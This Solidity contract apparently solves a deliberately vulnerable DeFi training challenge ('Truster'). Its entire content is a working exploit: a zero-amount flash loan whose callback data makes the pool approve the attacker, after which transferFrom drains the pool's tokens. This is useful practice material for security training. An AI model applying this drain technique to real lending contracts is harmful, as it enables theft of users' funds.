// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterAttack {
    TrusterLenderPool pool;
    ERC20 token;
    address recovery;

    constructor(TrusterLenderPool _pool, address _token, address _recovery, uint256 amount) {
        pool = _pool;
        token = ERC20(_token);
        recovery = _recovery;

        pool.flashLoan(
            0, address(this), address(token), abi.encodeWithSelector(token.approve.selector, address(this), amount)
        );
        token.transferFrom(address(pool), recovery, amount);
    }


}
